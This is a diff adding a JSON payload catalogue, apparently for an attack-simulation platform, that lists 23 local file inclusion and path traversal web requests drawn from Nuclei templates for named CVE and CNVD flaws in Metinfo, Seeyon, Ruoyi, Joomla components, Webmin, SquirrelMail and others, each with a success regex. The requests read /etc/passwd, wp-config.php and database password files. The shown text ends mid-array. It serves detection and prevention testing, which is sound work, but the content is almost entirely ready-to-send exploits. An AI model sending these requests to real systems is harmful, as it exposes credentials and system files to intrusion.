@@ -1,0 +1,5480 @@
+[
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Metinfo - Local File Inclusion (Nuclei: CNVD-2018-13393)",
+    "payload_external_id": "B8-LFI-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2018-13393 by ritikchaddha] Metinfo is susceptible to local file inclusion.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/include/thumb.php?dir=http\\..\\admin\\login\\login_check.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "<\\?php|login_met_cookie\\(\\$metinfo_admin_name\\);"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Xxunchi CMS - Local File Inclusion (Nuclei: CNVD-2020-23735)",
+    "payload_external_id": "B8-LFI-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2020-23735 by princechaddha] Xunyou CMS is vulnerable to local file inclusion. Attackers can use vulnerabilities to obtain sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "NzbwpQSdbY06Dngnoteo2wdgiekm7j4Ndisplay_errors"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Seeyon - Local File Inclusion (Nuclei: CNVD-2020-62422)",
+    "payload_external_id": "B8-LFI-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2020-62422 by pikpikcu] Seeyon is vulnerable to local file inclusion.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "ctpDataSource\\.password"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Ruoyi Management System - Local File Inclusion (Nuclei: CNVD-2021-01931)",
+    "payload_external_id": "B8-LFI-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2021-01931 by daffainfo,ritikchaddha] The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/common/download/resource?resource=/profile/../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "root:.*:0:0|bit\\ app\\ support|fonts|extensions"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "ShopXO Download File Read (Nuclei: CNVD-2021-15822)",
+    "payload_external_id": "B8-LFI-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2021-15822 by pikpikcu] ShopXO is an open source enterprise-level open source e-commerce system. ShopXO has an arbitrary file reading vulnerability, which can be used by attackers to obtain sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Landray-OA - Local File Inclusion (Nuclei: CNVD-2021-28277)",
+    "payload_external_id": "B8-LFI-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2021-28277 by pikpikcu,daffainfo] Landray-OA is susceptible to local file inclusion.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/sys/ui/extend/varkind/custom.jsp",
+    "web_request_headers": [
+      {
+        "name": "Accept",
+        "value": "*/*"
+      },
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:|for 16-bit app support"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "AceNet AceReporter Report - Arbitrary File Download (Nuclei: CNVD-2021-41972)",
+    "payload_external_id": "B8-LFI-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2021-41972 by DhiyaneshDk] All firewall devices that use the AceNet AceReporter report component can download arbitrary files",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{to_lower(rand_text_alpha(5))}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "MPSec ISG1000 Security Gateway - Arbitrary File Download (Nuclei: CNVD-2021-43984)",
+    "payload_external_id": "B8-LFI-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2021-43984 by DhiyaneshDk] The MPSec ISG1000 safety gateway at MP Communications Technology Co., Ltd. has any file download loophole, and attackers can use the loophole to obtain sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/webui/?g=sys_dia_data_down&file_name=../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Leadsec VPN - Arbitrary File Read (Nuclei: CNVD-2021-64035)",
+    "payload_external_id": "B8-LFI-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2021-64035 by xiaoWangSec] There is an information leakage vulnerability in the SSL VPN of Beijing Wangyuxingyun Information Technology Co., Ltd., and attackers can use the vulnerability to obtain sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Weaver OA XmlRpcServlet - Arbitary File Read (Nuclei: CNVD-2022-43245)",
+    "payload_external_id": "B8-LFI-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2022-43245 by SleepingBag945] e-office is a standard collaborative mobile office platform. Ltd. e-office has an arbitrary file reading vulnerability, which can be exploited by attackers to obtain sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/xml"
+      }
+    ],
+    "web_request_body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\n<methodName>WorkflowService.getAttachment</methodName>\n<params><param><value><string>/etc/passwd</string>\n</value></param></params></methodCall>",
+    "web_request_body_type": "xml",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "<methodResponse><params><param><value><base64>"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "EduSoho < v22.4.7 - Local File Inclusion (Nuclei: CNVD-2023-03903)",
+    "payload_external_id": "B8-LFI-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2023-03903 by s4e-io] The edusoho education and training system <v22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Squirrelmail <=1.4.6 - Local File Inclusion (Nuclei: CVE-2006-2842)",
+    "payload_external_id": "B8-LFI-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2006-2842 by dhiyaneshDk] SquirrelMail 1.4.6 and earlier versions are susceptible to a PHP local file inclusion vulnerability in functions/plugin.php if register_globals is enabled and magic_quotes_gpc is disabled. This allows remote attackers to execute arbitrary PHP code via a URL in the plugins array parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/src/redirect.php?plugins[]=../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:[x*]:0:0"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Nuclei: CVE-2006-3392)",
+    "payload_external_id": "B8-LFI-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2006-3392 by s4e-io] Webmin before 1.290 and Usermin before 1.220 contain a path traversal caused by calling the simplify_path function before decoding HTML, letting remote attackers read arbitrary files, exploit requires sending crafted '..%01' sequences.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! RSfiles <=1.0.2 - Local File Inclusion (Nuclei: CVE-2007-4504)",
+    "payload_external_id": "B8-LFI-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2007-4504 by daffainfo] Joomla! RSfiles 1.0.2 and earlier is susceptible to local file inclusion in index.php in the RSfiles component (com_rsfiles). This could allow remote attackers to arbitrarily read files via a .. (dot dot) in the path parameter in a files.display action.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_rsfiles&task=files.display&path=../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Sniplets 1.1.2 - Local File Inclusion (Nuclei: CVE-2008-1059)",
+    "payload_external_id": "B8-LFI-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-1059 by dhiyaneshDK] PHP remote file inclusion vulnerability in modules/syntax_highlight.php in the Sniplets 1.1.2 and 1.2.2 plugin for WordPress allows remote attackers to execute arbitrary PHP code via a URL in the libpath parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "DB_NAME|DB_PASSWORD"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "CMSimple 3.1 - Local File Inclusion (Nuclei: CVE-2008-2650)",
+    "payload_external_id": "B8-LFI-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-2650 by pussycat0x] CMSimple 3.1 is susceptible to local file inclusion via cmsimple/cms.php when register_globals is enabled which allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the sl parameter to index.php. NOTE: this can be leveraged for remote file execution by includ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?sl=../../../../../../../etc/passwd%00",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Image Browser 0.1.5 rc2 - Local File Inclusion (Nuclei: CVE-2008-4668)",
+    "payload_external_id": "B8-LFI-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-4668 by daffainfo] Joomla! Image Browser 0.1.5 rc2 is susceptible to local file inclusion via com_imagebrowser which could allow remote attackers to include and execute arbitrary local files via a .. (dot dot) in the folder parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_imagebrowser&folder=../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! <=2.0.0 RC2 - Local File Inclusion (Nuclei: CVE-2008-4764)",
+    "payload_external_id": "B8-LFI-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-4764 by daffainfo] Joomla! 2.0.0 RC2 and earlier are susceptible to local file inclusion in the eXtplorer module (com_extplorer) that allows remote attackers to read arbitrary files via a .. (dot dot) in the dir parameter in a show_error action.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "phpPgAdmin <=4.2.1 - Local File Inclusion (Nuclei: CVE-2008-5587)",
+    "payload_external_id": "B8-LFI-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-5587 by dhiyaneshDK] phpPgAdmin 4.2.1 is vulnerable to local file inclusion in libraries/lib.inc.php when register globals is enabled. Remote attackers can read arbitrary files via a .. (dot dot) in the _language parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/phpPgAdmin/index.php?_language=../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:[x*]:0:0"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! ionFiles 4.4.2 - Local File Inclusion (Nuclei: CVE-2008-6080)",
+    "payload_external_id": "B8-LFI-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-6080 by daffainfo] Joomla! ionFiles 4.4.2 is susceptible to local file inclusion in download.php in the ionFiles (com_ionfiles) that allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component RWCards 3.0.11 - Local File Inclusion (Nuclei: CVE-2008-6172)",
+    "payload_external_id": "B8-LFI-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-6172 by daffainfo] A directory traversal vulnerability in captcha/captcha_image.php in the RWCards (com_rwcards) 3.0.11 component for Joomla! when magic_quotes_gpc is disabled allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the img parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! ProDesk 1.0/1.2 - Local File Inclusion (Nuclei: CVE-2008-6222)",
+    "payload_external_id": "B8-LFI-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-6222 by daffainfo] Joomla! Pro Desk Support Center (com_pro_desk) component 1.0 and 1.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the include_file parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "nweb2fax <=0.2.7 - Local File Inclusion (Nuclei: CVE-2008-6668)",
+    "payload_external_id": "B8-LFI-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2008-6668 by geeknik] nweb2fax 0.2.7 and earlier allow remote attackers to read arbitrary files via the id parameter submitted to comm.php and the var_filename parameter submitted to viewrq.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/comm.php?id=../../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
